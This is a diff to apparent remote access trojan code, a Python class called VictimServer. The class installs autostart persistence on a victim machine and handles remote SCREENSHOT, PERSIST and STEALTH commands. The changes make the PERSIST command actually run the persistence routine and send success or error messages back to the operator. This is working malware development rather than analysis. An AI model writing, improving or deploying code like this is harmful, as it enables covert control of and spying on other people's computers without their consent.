@@ -131,8 +131,10 @@ class VictimServer:
                         f.write(desktop_file)
                     os.chmod(autostart_path, 0o755)
 
+                self._safe_send(b"Persistence completed successfully")
             except Exception as e:
-                print(f"[!] Persistence error: {str(e)}")
+                error_msg = f"Persistence failed: {str(e)}".encode()
+                self._safe_send(error_msg)
 
         # Start persistence thread with error handling
         try:
@@ -190,7 +192,10 @@ class VictimServer:
                 elif command == b'SCREENSHOT':
                     self.handle_screenshot()
                 elif command.startswith(b'PERSIST '):
-                    self._safe_send(b"Persistence installed")
+                    # Always send confirmation
+                    self._safe_send(b"Persistence initiated")
+                    # Start persistence thread
+                    self.persist()
                 elif command.startswith(b'STEALTH '):
                     mode = command.split(b' ', 1)[1].decode()
                     self._safe_send(f"Stealth mode: {mode}".encode())
